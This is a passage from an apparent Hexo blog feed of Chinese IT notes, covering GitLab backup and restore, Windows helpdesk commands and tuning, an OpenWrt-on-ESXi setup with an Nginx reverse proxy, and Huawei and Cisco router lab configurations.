-ps</code></pre><h3 id="恢复管理"><a href="#恢复管理" class="headerlink" title="恢复管理"></a>恢复管理</h3><p>恢复是删除原有数据，恢复备份tar包中的数据。</p><ol><li>先停止数据写入服务</li></ol><pre><code class="hljs bash">gitlab-ctl stop unicorngitlab-ctl stop sidekiq</code></pre><ol><li>还原</li></ol><pre><code class="hljs bash"><span class="hljs-comment"># 1. 查看要还原的文件</span><span class="hljs-built_in">ls</span> /data/backup/gitlab -p<span class="hljs-comment"># 2. 还原，只需要写到时间戳就可以了1625903798_2021_07_10_12.5.2_gitlab_backup.tar</span>gitlab-rake gitlab:backup:restore BACKUP=1625903798_2021_07_10_12.5.2<span class="hljs-comment"># 3. 查看时间戳的时间</span><span class="hljs-built_in">date</span> -d @1625903798</code></pre><ol><li>设定计划划任务</li></ol><pre><code class="hljs bash">定时任务Crontab中加入0 2 * * * /usr/bin/gitlab-rake gitlab:backup:create策略建议: 本地保留三到七天 在异地备份永久保存手动备份测试: gitlab-rake gitlab:backup:create<span class="hljs-comment"># ls /data/backup/gitlab/</span>1576053273_2019_12_11_12.5.2_gitlab_backup.tar注意 gitlab.rb 和 gitlab-secrets.json 两个文件包含敏感信息。未被备份到备份文件中。需要手动备份</code></pre><h2 id="基于Jenkins-实现持续集成"><a href="#基于Jenkins-实现持续集成" class="headerlink" title="基于Jenkins 实现持续集成"></a>基于Jenkins 实现持续集成</h2><h3 id="持续集成-Continuous-integration"><a href="#持续集成-Continuous-integration" class="headerlink" title="持续集成(Continuous integration)"></a>持续集成(Continuous integration)</h3><ol><li>持续集成(CI)简介。持续集成是一种软件开发实践，即团队开发成员经常集成他们的工作，通常每个成员媒体至少集成一次，也就意味着每天可能会发生多次集成。每次集成都通过自动化的构建（包括编译，发布，自动化测试）来验证，从而尽快地发现集成错误。许多团队发现这个过程可以大大减少集成的问题，让团队能够更快的开发内聚的软件。</li><li>没有持续集成。项目做模块集成的时候，发现很多接口都不通(浪费大量时间)。需要人手动去编译打包最新的代码(构建过程不透明)。发布代码，上线，基本靠手(脚步乱发)。</li><li>持续集成最佳实践。</li><li>持续集成的过程</li></ol><h3 id="持续交付-Continuous-delivery-CD"><a href="#持续交付-Continuous-delivery-CD" class="headerlink" title="持续交付(Continuous delivery, CD)"></a>持续交付(Continuous delivery, CD)</h3><h3 id="持续部署-Continuous-Deployment-CD"><a href="#持续部署-Continuous-Deployment-CD" class="headerlink" title="持续部署(Continuous Deployment, CD)"></a>持续部署(Continuous Deployment, CD)</h3><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ol><li>gitlab-ctl command</li></ol><pre><code class="hljs bash">gitlab-ctl start <span class="hljs-comment"># 启动所有服务</span>gitlab-ctl restart <span class="hljs-comment"># 重启所有服务</span>gitlab-ctl stop <span class="hljs-comment"># 关闭所有服务</span>gitlab-ctl status <span class="hljs-comment"># 查看所有服务状态</span>gitlab-ctl <span class="hljs-built_in">tail</span><span class="hljs-comment"># 查看日志信息</span>gitlab-ctl service-list <span class="hljs-comment"># 列举所有启动服务</span>gitlab-ctl  graceful-kill <span class="hljs-comment"># 平稳停止一个服务</span>gitlab-ctl reconfigure <span class="hljs-comment"># 修改配置文件之后，需要重新加载下</span>gitlab-ctl show-config <span class="hljs-comment"># 查看所有服务配置文件信息</span>gitlab-ctl uninstall <span class="hljs-comment"># 卸载这个软件</span>gitlab-ctl cleanse <span class="hljs-comment"># 删除gitlab 数据，重新白手起家</span></code></pre><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol><li>库默认存储目录:<br>&#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;git-data&#x2F;repositories&#x2F;rootopt&#x2F;gitlab</li><li>应用代码和相应的依赖程序: &#x2F;opt&#x2F;gitlab</li><li>命令编译后的应用数据和配置文件，不需要人为修改配置后的应用数据和<br>配置文件: &#x2F;var&#x2F;opt&#x2F;gitlab: gitlab-ctl reconfigure:命令编译后的应用数据和<br>配置文件，不需要人为修改配置</li><li>配置文件目录: &#x2F;etc&#x2F;gitlab</li><li>此目录下存放了gitlab各个组件产生的日志: &#x2F;var&#x2F;log&#x2F;gitlab</li><li>备份文件生成的目录: &#x2F;var&#x2F;opt&#x2F;gitlab&#x2F;backups&#x2F;</li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HelpDesk</title>
      <link href="/2023/11/30/HelpDesk/"/>
      <url>/2023/11/30/HelpDesk/</url>
      
        <content type="html"><![CDATA[<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><pre><code class="hljs bash"><span class="hljs-comment"># 快速打开win10高级设置的run命令</span>sysdm.cpl<span class="hljs-comment"># 快速打开remote desktop connect</span>mstsc<span class="hljs-comment"># 键盘管理员打开CMD</span>运行 Win + R, 输入 CMD 后，按 Ctrl + Shift + Enter回车<span class="hljs-comment"># 查看用户账号状态命令</span>net user usernamexxx /domain<span class="hljs-comment"># 激活win10</span>wmic path softwarelicensingservice get OA3xOriginalProductKeyslmgr -ipk XXXX-XXXXXslmgr -ato<span class="hljs-comment"># 普通用户视图下提权安装软件 需要知道administrator 的密码</span>runas /user:%computername%\administrator /profile <span class="hljs-string">&quot;full_pathxxx.exe&quot;</span><span class="hljs-comment"># 重新注册DNS</span>ipconfig /registerdns<span class="hljs-comment"># 刷新当前DNS</span>ipconfig /flushdns </code></pre><h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li>查看被占用端口对应的 PID</li></ol><pre><code class="hljs ps1">netstat <span class="hljs-literal">-aon</span>|findstr <span class="hljs-string">&quot;8081&quot;</span>language<span class="hljs-literal">-ps1</span>复制代码</code></pre><ol><li>查看指定 PID 的进程</li></ol><pre><code class="hljs ps1">tasklist|findstr <span class="hljs-string">&quot;9088&quot;</span>language<span class="hljs-literal">-ps1</span>复制代码</code></pre><ol><li>结束进程</li></ol><pre><code class="hljs ps1">taskkill /T /F /PID <span class="hljs-number">9088</span>language<span class="hljs-literal">-ps1</span>复制代码</code></pre><h2 id="PsTools"><a href="#PsTools" class="headerlink" title="PsTools"></a>PsTools</h2><blockquote><p><strong><a href="https://download.sysinternals.com/files/PSTools.zip">PsTools下载链接</a></strong></p></blockquote><pre><code class="hljs bash"><span class="hljs-comment"># 管理员权限打开CMD，并且进入PsTools解压目录</span><span class="hljs-comment"># 运行PsExec.exe \\IP cmd 进入目标主机的CMD试图</span><span class="hljs-comment"># 使用ipconfig和hostname命令查询当前试图下的IP地址和主机名是否是目标用户的</span></code></pre><h2 id="Remote-Server-Administration-Tools-for-Windows"><a href="#Remote-Server-Administration-Tools-for-Windows" class="headerlink" title="Remote Server Administration Tools for Windows"></a>Remote Server Administration Tools for Windows</h2><blockquote><p><strong><a href="https://www.microsoft.com/en-hk/download/details.aspx?id=45520">AD管理工具下载</a></strong></p></blockquote><pre><code class="hljs bash"><span class="hljs-comment"># 可以执行AD的一些操作，例如用户和电脑的权限</span><span class="hljs-comment"># 用户的账号解锁，密码重置和组的增删查改等</span><span class="hljs-comment"># 电脑的查询</span></code></pre><h2 id="AD"><a href="#AD" class="headerlink" title="AD"></a>AD</h2><pre><code class="hljs bash"><span class="hljs-comment"># 同步AD策略，打开CMD执行以下命令可以同步AD策略。</span>gpupdate<span class="hljs-comment"># 查询用户的状态</span>net user usernameXXX /domain</code></pre><hr><h1 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h1><h2 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h2><pre><code class="hljs bash"><span class="hljs-comment"># 优化</span>关闭显卡，关闭后台运行，关闭预加载<span class="hljs-comment"># 网站排查</span>开启调试模式，关闭缓存，清理缓存数据</code></pre><h3 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h3><pre><code class="hljs bashe">language-bashe复制代码</code></pre><h3 id="浏览器崩溃"><a href="#浏览器崩溃" class="headerlink" title="浏览器崩溃"></a>浏览器崩溃</h3><h3 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h3><h3 id="页面不安全"><a href="#页面不安全" class="headerlink" title="页面不安全"></a>页面不安全</h3><hr><h2 id="会议软件"><a href="#会议软件" class="headerlink" title="会议软件"></a>会议软件</h2><h3 id="腾讯"><a href="#腾讯" class="headerlink" title="腾讯"></a>腾讯</h3><h3 id="Zoom"><a href="#Zoom" class="headerlink" title="Zoom"></a>Zoom</h3><h3 id="Teams"><a href="#Teams" class="headerlink" title="Teams"></a>Teams</h3><hr><h2 id="远程软件"><a href="#远程软件" class="headerlink" title="远程软件"></a>远程软件</h2><h3 id="会议软件共享远程"><a href="#会议软件共享远程" class="headerlink" title="会议软件共享远程"></a>会议软件共享远程</h3><h3 id="msra-远程"><a href="#msra-远程" class="headerlink" title="msra 远程"></a>msra 远程</h3><h3 id="系统-Remote"><a href="#系统-Remote" class="headerlink" title="系统 Remote"></a>系统 Remote</h3><hr><h1 id="Office-套件"><a href="#Office-套件" class="headerlink" title="Office 套件"></a>Office 套件</h1><h2 id="Outlook"><a href="#Outlook" class="headerlink" title="Outlook"></a>Outlook</h2><h3 id="性能优化-1"><a href="#性能优化-1" class="headerlink" title="性能优化"></a>性能优化</h3><h3 id="邮件-Archive"><a href="#邮件-Archive" class="headerlink" title="邮件 Archive"></a>邮件 Archive</h3><h3 id="安全模式-插件"><a href="#安全模式-插件" class="headerlink" title="安全模式&amp;插件"></a>安全模式&amp;插件</h3><h3 id="共享日程安排"><a href="#共享日程安排" class="headerlink" title="共享日程安排"></a>共享日程安排</h3><hr><h1 id="Win10-系统制作"><a href="#Win10-系统制作" class="headerlink" title="Win10 系统制作"></a>Win10 系统制作</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h2 id="自封装母盘"><a href="#自封装母盘" class="headerlink" title="自封装母盘"></a>自封装母盘</h2><h3 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h3><h3 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a>系统优化</h3><blockquote><p>禁用 加密文件系统（EFS）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202410310838397.png" alt="img"></p><h2 id="自定义系统设置"><a href="#自定义系统设置" class="headerlink" title="自定义系统设置"></a>自定义系统设置</h2><h3 id="更新补丁"><a href="#更新补丁" class="headerlink" title="更新补丁"></a>更新补丁</h3><h3 id="安装运行库"><a href="#安装运行库" class="headerlink" title="安装运行库"></a>安装运行库</h3><h3 id="设置通知-因素"><a href="#设置通知-因素" class="headerlink" title="设置通知&amp;因素"></a>设置通知&amp;因素</h3><h3 id="修改时区与时间"><a href="#修改时区与时间" class="headerlink" title="修改时区与时间"></a>修改时区与时间</h3><h3 id="开启远程"><a href="#开启远程" class="headerlink" title="开启远程"></a>开启远程</h3><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><h3 id="字体-输入法"><a href="#字体-输入法" class="headerlink" title="字体&amp;输入法"></a>字体&amp;输入法</h3><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><h3 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h3><h2 id="清理环境"><a href="#清理环境" class="headerlink" title="清理环境"></a>清理环境</h2><h2 id="镜像封装"><a href="#镜像封装" class="headerlink" title="镜像封装"></a>镜像封装</h2><h3 id="一阶封装"><a href="#一阶封装" class="headerlink" title="一阶封装"></a>一阶封装</h3><h3 id="二阶封装"><a href="#二阶封装" class="headerlink" title="二阶封装"></a>二阶封装</h3><h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><h3 id="BIOS-设置"><a href="#BIOS-设置" class="headerlink" title="BIOS 设置"></a>BIOS 设置</h3><ol><li>Storage: 选择 AH</li></ol><h3 id="U-盘安装"><a href="#U-盘安装" class="headerlink" title="U 盘安装"></a>U 盘安装</h3><h3 id="无人值守安装"><a href="#无人值守安装" class="headerlink" title="无人值守安装"></a>无人值守安装</h3><hr><h1 id="Win10-系统运维"><a href="#Win10-系统运维" class="headerlink" title="Win10 系统运维"></a>Win10 系统运维</h1><h2 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h2><h3 id="手动更新"><a href="#手动更新" class="headerlink" title="手动更新"></a>手动更新</h3><h3 id="在线更新"><a href="#在线更新" class="headerlink" title="在线更新"></a>在线更新</h3><hr><h2 id="驱动更新"><a href="#驱动更新" class="headerlink" title="驱动更新"></a>驱动更新</h2><h3 id="在线更新-1"><a href="#在线更新-1" class="headerlink" title="在线更新"></a>在线更新</h3><h3 id="手动更新-1"><a href="#手动更新-1" class="headerlink" title="手动更新"></a>手动更新</h3><hr><h2 id="C-盘空间满"><a href="#C-盘空间满" class="headerlink" title="C 盘空间满"></a>C 盘空间满</h2><h3 id="清除恢复空间"><a href="#清除恢复空间" class="headerlink" title="清除恢复空间"></a>清除恢复空间</h3><h3 id="设置分页缓存"><a href="#设置分页缓存" class="headerlink" title="设置分页缓存"></a>设置分页缓存</h3><h3 id="关闭睡眠快速重启"><a href="#关闭睡眠快速重启" class="headerlink" title="关闭睡眠快速重启"></a>关闭睡眠快速重启</h3><blockquote><p>powercfg.exe &#x2F;h off</p></blockquote><h3 id="删除Windows-edb文件"><a href="#删除Windows-edb文件" class="headerlink" title="删除Windows.edb文件"></a>删除Windows.edb文件</h3><blockquote><p>C:\ProgramData\Microsoft\Search\Data\Applications\Windows</p></blockquote><hr><h2 id="电脑开机蓝屏"><a href="#电脑开机蓝屏" class="headerlink" title="电脑开机蓝屏"></a>电脑开机蓝屏</h2><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><h3 id="卸载最新更新"><a href="#卸载最新更新" class="headerlink" title="卸载最新更新"></a>卸载最新更新</h3><h3 id="清灰-查看内存"><a href="#清灰-查看内存" class="headerlink" title="清灰&amp;查看内存"></a>清灰&amp;查看内存</h3><hr><h2 id="电脑自动重启"><a href="#电脑自动重启" class="headerlink" title="电脑自动重启"></a>电脑自动重启</h2><hr><h2 id="登录界面没有字体"><a href="#登录界面没有字体" class="headerlink" title="登录界面没有字体"></a>登录界面没有字体</h2><hr><h2 id="电脑异响"><a href="#电脑异响" class="headerlink" title="电脑异响"></a>电脑异响</h2><hr><h1 id="Win10-系统迁移"><a href="#Win10-系统迁移" class="headerlink" title="Win10 系统迁移"></a>Win10 系统迁移</h1><h2 id="新电脑数据迁移"><a href="#新电脑数据迁移" class="headerlink" title="新电脑数据迁移"></a>新电脑数据迁移</h2><h2 id="原系统数据迁移"><a href="#原系统数据迁移" class="headerlink" title="原系统数据迁移"></a>原系统数据迁移</h2><h3 id="磁盘镜像备份"><a href="#磁盘镜像备份" class="headerlink" title="磁盘镜像备份"></a>磁盘镜像备份</h3><h3 id="磁盘镜像恢复"><a href="#磁盘镜像恢复" class="headerlink" title="磁盘镜像恢复"></a>磁盘镜像恢复</h3><h3 id="脱域和修改主机名"><a href="#脱域和修改主机名" class="headerlink" title="脱域和修改主机名"></a>脱域和修改主机名</h3><h3 id="清除和安装驱动"><a href="#清除和安装驱动" class="headerlink" title="清除和安装驱动"></a>清除和安装驱动</h3><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><h2 id="Win10电脑性能优化"><a href="#Win10电脑性能优化" class="headerlink" title="Win10电脑性能优化"></a>Win10电脑性能优化</h2><h3 id="1-禁用特效"><a href="#1-禁用特效" class="headerlink" title="1. 禁用特效"></a>1. 禁用特效</h3><blockquote><p>System Properties &gt; Advanced &gt; Visual Effects &gt; Custom 打开以下配置</p><ol><li>Enable Peek &#x2F; 启用预览</li><li>Smooth edges of screen fonts &#x2F; 平滑屏幕字体边缘</li><li>Show thumbnails instead of icons &#x2F; 显 示缩列图，而不是显示图标</li></ol></blockquote><h3 id="2-电源计划-快速启动"><a href="#2-电源计划-快速启动" class="headerlink" title="2. 电源计划 &amp; 快速启动"></a>2. 电源计划 &amp; 快速启动</h3><blockquote><p>Control Panel &gt; All Control Panel Items &gt; Power Options</p><ol><li>选择 Hide additional plans</li></ol></blockquote><h3 id="3-有效内存"><a href="#3-有效内存" class="headerlink" title="3. 有效内存"></a>3. 有效内存</h3><blockquote><p>Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management</p><ol><li>DisablePagingExecutive &#x3D; 1 使用内存运行程序</li><li>LargeSystemCache &#x3D; 1 开启大容量换成</li></ol></blockquote><h3 id="4-打开最大预加载到内存里的文件数量"><a href="#4-打开最大预加载到内存里的文件数量" class="headerlink" title="4. 打开最大预加载到内存里的文件数量"></a>4. 打开最大预加载到内存里的文件数量</h3><blockquote><p>powershell &gt; mmagent</p><ol><li>输入 set-mmagent 回车，在输入要修改的值 8192，默认是 256</li></ol></blockquote><h3 id="5-启动项优化"><a href="#5-启动项优化" class="headerlink" title="5. 启动项优化"></a>5. 启动项优化</h3><h3 id="6-Office优化"><a href="#6-Office优化" class="headerlink" title="6. Office优化"></a>6. Office优化</h3><blockquote><p>禁用硬件图像加速</p></blockquote><h3 id="7-Chrome浏览器优化"><a href="#7-Chrome浏览器优化" class="headerlink" title="7. Chrome浏览器优化"></a>7. Chrome浏览器优化</h3><blockquote><ol><li>关闭 使用图形加速功能（如果可用）”；</li><li>关闭 Google Chrome 后继续运行后台应用；</li><li>关闭 预加载网页。</li></ol></blockquote><h3 id="8-注册表优化"><a href="#8-注册表优化" class="headerlink" title="8. 注册表优化"></a>8. 注册表优化</h3><h3 id="9-AHCI-NVME"><a href="#9-AHCI-NVME" class="headerlink" title="9. AHCI &#x2F; NVME"></a>9. AHCI &#x2F; NVME</h3><p>BIOS &gt; Storage &gt; SATA&#x2F;NVMe Operation &gt; AHCI&#x2F;NVMe</p><h3 id="10-关闭微软的遥控服务"><a href="#10-关闭微软的遥控服务" class="headerlink" title="10. 关闭微软的遥控服务"></a>10. 关闭微软的遥控服务</h3><p>Connected User Experiences and Telemetry</p><h3 id="11-虚拟内存-1-5X～2-5X"><a href="#11-虚拟内存-1-5X～2-5X" class="headerlink" title="11. 虚拟内存 1.5X～2.5X"></a>11. 虚拟内存 1.5X～2.5X</h3><blockquote><p>System Configuration &gt; Boot &gt; Advanced options &gt; Maximum memory 去掉勾选</p></blockquote><blockquote><p>16G 24576 - 40960<br>32G 49152 - 81920</p></blockquote><h3 id="12-从信息系统项目管理师的角度看工作"><a href="#12-从信息系统项目管理师的角度看工作" class="headerlink" title="12. 从信息系统项目管理师的角度看工作"></a>12. 从信息系统项目管理师的角度看工作</h3><pre><code class="hljs bash">1. 项目立项2. 项目整体管理3. 项目范围管理4. 项目进度管理5. 项目成本管理6. 项目质量管理7. 项目沟通管理8. 项目干系人管理9. 项目风险管理10. 项目采购管理11. 信息系统项目管理</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OpenWrt</title>
      <link href="/2023/11/18/OpenWrt/"/>
      <url>/2023/11/18/OpenWrt/</url>
      
        <content type="html"><![CDATA[<ol><li>打开并登录 <a href="https://openwrt.ai/">https://openwrt.ai</a>;</li><li>构建 OpenwWrt 的固件. 勾选 luci-app-ttyd, luci-app-ipsec-server<br>默认主题: Argon;<br>后台地址: 192.168.44.1&#x2F;24;<br>后台密码: H;<br>Web 服务器: Nginx<br>EFI 镜像: 勾选<br>主机名: OpenWrt<br>根目录: 1004<br>自定义签名: HuangFamily<br>去除作者外链: 勾选<br>文件系统: SquashFS<br>WMDK 镜像(ESXI 专用): 勾选</li><li>下载镜像: ESXI 专用, 解压后使用.</li><li>打开并登录 ESXI 8.0。<a href="https://192.168.44.3/">https://192.168.44.3</a></li><li>新建虚拟机。 名称:OpenWrt;<br>兼容性: ESXI 8.0 虚拟机;<br>客户机操作系统系列: Linux<br>操作机操作系统版本: 其他 Linux 64 位</li><li>自定义虚拟机的配置: CPU:2; 内存: 1G;<br>删除硬盘、USB 控制器 1、CD&#x2F;DVD 驱动器 1<br>添加 3 个 PCI 设备;<br>添加硬盘 &gt; 现有磁盘 &gt; 上传 VMDK 文件。<br>保持并打开虚拟机</li><li>修改网络 IP 地址： vi &#x2F;etc&#x2F;config&#x2F;network<br>service network restart</li><li>登录<a href="https://192.168.44.1/">https://192.168.44.1</a></li><li>添加腾讯云的 DDNS，luci-app-tencentddns_0.1.0-1_all.ipk</li><li>配置腾讯云 DDNS: 密钥 ID: 4; 密钥 Token: 9;</li><li>OpenWrt &gt; 系统 &gt; 高级设置 &gt; NGINX &gt; 将 80 端口修改为 14480 和 443 端口修改为 14443</li><li>创建 &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;crt 目录，并上传正式</li><li>Nginx 设置，并打开防火墙的入站数据</li></ol><pre><code class="hljs conf">server &#123;        listen 443 ssl;        server_name huangfamily.cn;        ssl_certificate /etc/nginx/conf.d/crt/huangfamily.cn_bundle.crt;        ssl_certificate_key /etc/nginx/conf.d/crt/huangfamily.cn.key;        ssl_session_timeout 5m;        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;        ssl_prefer_server_ciphers on;        location / &#123;            proxy_pass https://192.168.44.1:14443;            proxy_redirect off;            proxy_set_header X-Real-IP $remote_addr;            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;            proxy_set_header Host $http_host;            proxy_set_header X-NginX-Proxy true;proxy_http_version 1.1;            proxy_set_header Upgrade $http_upgrade;            proxy_set_header Connection &quot;upgrade&quot;;        &#125;&#125;server &#123;    listen 80;    server_name huangfamily.cn;    return 301 https://$host$request_uri;&#125;language-conf复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>华为NP网络实验</title>
      <link href="/2023/06/01/HCNP-Lab/"/>
      <url>/2023/06/01/HCNP-Lab/</url>
      
        <content type="html"><![CDATA[<h2 id="01-BFD实验"><a href="#01-BFD实验" class="headerlink" title="01 BFD实验"></a>01 BFD实验</h2><ol><li>是什么: BFD可用于端到端双向转发检测的公有协议；</li><li>应用场景: 静态路由的冗余备份场景，实现主备路由切换。</li><li>场景设计: 两个网络A&#x2F;B之间仅存在两条静态路由a&#x2F;b(a为明细路由, b为汇总路由)，BFD可检测a路由之间的联通性，从而联动a路由，实现数据包a&#x2F;b路由的切换。</li></ol><details>  <summary>配置概述</summary>  <pre><code class="hljs bash">1. 在AR1路由器上，配置接口IP，和通往2个網絡的靜態路由。2. 在AR2路由器上，配置接口IP，配置LoopBack地址模擬其中一個網絡，添加1條靜態路由，啟用BFD和配置AR2/3的a路由的鏈路檢測，配置1條靜態路由並關聯BFD。3. 在AR3路由器上，配置接口IP，配置LoopBack地址模擬其中一個網絡，添加1條靜態路由，啟用BFD和配置AR3/2的a路由的鏈路檢測，配置1條靜態路由並關聯BFD。</code></pre></details><details>  <summary>AR1</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname AR1<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ip address 12.1.1.1 24<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1ip address 13.1.1.1 24<span class="hljs-comment"># </span>quitdisplay ip interface brief<span class="hljs-comment"># </span>ip route-static 2.2.2.2 32 GigabitEthernet 0/0/0 12.1.1.1ip route-static 3.3.3.3 32 GigabitEthernet 0/0/1 13.1.1.1<span class="hljs-comment"># </span>display ip routing-table protocol static</code></pre></details><details>  <summary>AR2</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname AR2<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ip address 23.1.1.2 24<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1ip address 12.1.1.2 24<span class="hljs-comment"># </span>quitdisplay ip interface brief<span class="hljs-comment">#</span>ip route-static 13.1.1.3 24 GigabitEthernet 0/0/1ip route-static 3.3.3.0 24 GigbitEthernet 0/0/0 23.1.1.3display ip routing-table protocol static<span class="hljs-comment">#   </span>bfdquit<span class="hljs-comment"># </span>bfd 1 <span class="hljs-built_in">bind</span> peer-ip 13.1.1.3 source-ip 12.1.1.2 autoquit<span class="hljs-comment"># </span>ip route-static 3.3.3.3 32 GigabitEthernet 0/0/1 12.1.1.1 track bfd-session 1display ip routing-table protocol static</code></pre></details><details>  <summary>AR3</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span>system-viewsysname AR3<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/0ip address 12.1.1.2 24<span class="hljs-comment"># </span>interface GigabitEthernet 0/0/1ip address 23.1.1.2 24<span class="hljs-comment"># </span>quitdisplay ip interface brief<span class="hljs-comment">#</span>ip route-static 12.1.1.2 24 GigabitEthernet 0/0/0ip route-static 2.2.2.0 24 GigbitEthernet 0/0/1 23.1.1.2display ip routing-table protocol static<span class="hljs-comment"># </span>bfdquit<span class="hljs-comment"># </span>bfd 1 <span class="hljs-built_in">bind</span> peer-ip 12.1.1.2 source-ip 13.1.1.3 autoquit<span class="hljs-comment"># </span>ip route-static 2.2.2.2 32 GigabitEthernet 0/0/0 13.1.1.1 track bfd-session 1display ip routing-table protocol static</code></pre></details><details>  <summary>测试验证</summary>  <pre><code class="hljs bash">tracert -a 2.2.2.2 3.3.3.3ping -c 10000 -a 2.2.2.2 3.3.3.3</code></pre></details><hr><h2 id="02-NQA實驗"><a href="#02-NQA實驗" class="headerlink" title="02 NQA實驗"></a>02 NQA實驗</h2><p>实验概述。</p><p><img src="/" alt="实验拓扑"></p><details>  <summary>配置概述</summary>  <pre><code class="hljs bash">1.</code></pre></details><details>  <summary>AR1</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># NQA</span>nqa test-instance Admin Tigerlabtest-type icmpdestination-address ipv4 13.1.1.3source-address ipv4 12.1.1.2threshold rtd 1frequency 5<span class="hljs-built_in">timeout</span> 2probe-count 1start now<span class="hljs-comment"># 聯動方法和BFD一樣，檢查命令如下</span>display nqa resultsdisplay nqa <span class="hljs-built_in">history</span>tracert -a 2.2.2.2 3.3.3.3</code></pre></details><details>  <summary>测试验证</summary></details><hr><h2 id="实验模板"><a href="#实验模板" class="headerlink" title="实验模板"></a>实验模板</h2><p>实验概述。</p><p><img src="/" alt="实验拓扑"></p><details>  <summary>配置概述</summary>  <pre><code class="hljs bash">1.</code></pre></details><details>  <summary>AR1</summary>  <pre><code class="hljs bash"><span class="hljs-comment"># </span><span class="hljs-built_in">enable</span>configure terminalhostname AR1</code></pre></details><details>  <summary>测试验证</summary></details>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CCNP Lab</title>
      <link href="/2023/06/01/CCNP-Lab/"/>
      <url>/2023/06/01/CCNP-Lab/</url>
      
        <content type="html"><![CDATA[<h2 id="简单的-SLA-实验"><a href="#简单的-SLA-实验" class="headerlink" title="简单的 SLA 实验"></a>简单的 SLA 实验</h2><p>使用 SLA 检测主链路的连接状态，实现主备链路的动态切换功能。</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/202306111953555.png" alt="实验拓扑"></p><p>实验拓扑</p><details open=""><summary>配置概述</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">1. 配置接口IP2. 配置除目标网络的主备路由的其他路由信息3. 配置SLA4. 配置Track 23 ip sla 235. 配置主静态路由tarck 236. 配置备份静态路由 permanent</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 10px;"></span></div></pre></details><details open=""><summary>R1</summary><pre style="position: relative;"><code class="language-bash hljs" style="display: block; overflow-x: auto; padding: 18px 15px 12px; color: rgb(171, 178, 191); background: rgb(40, 44, 52); font-size: 14px; border-radius: 3px; font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace;">&gt;<span class="hljs-built_in" style="color: rgb(230, 192, 123);">enable</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>configure terminalhostname R1<span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">##</span>interface ethernet 0/0ip address 12.1.1.1 255.255.255.0no shutdown<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>interface ethernet 0/1ip address 13.1.1.1 255.255.255.0no shutdown<span class="hljs-built_in" style="color: rgb(230, 192, 123);">exit</span><span class="hljs-comment" style="color: rgb(92, 99, 112); font-style: italic;">#</span>ip route 2.2.2.2 255.255.255.255 ethernet 0/0 12.1.1.2ip route 3.3.3.3 255.255.255.255 ethernet 0/1 13.1.1.3</code><div class="code-embed" style="position: absolute; font-size: 12px; top: 3px; right: 15px; color: rgba(140, 140, 140, 0.8);"><span class="code-embed-type">language-bash</span><span class="code-embed-copy" onclick="copyCode(this)" style="cursor: pointer; padding-left: 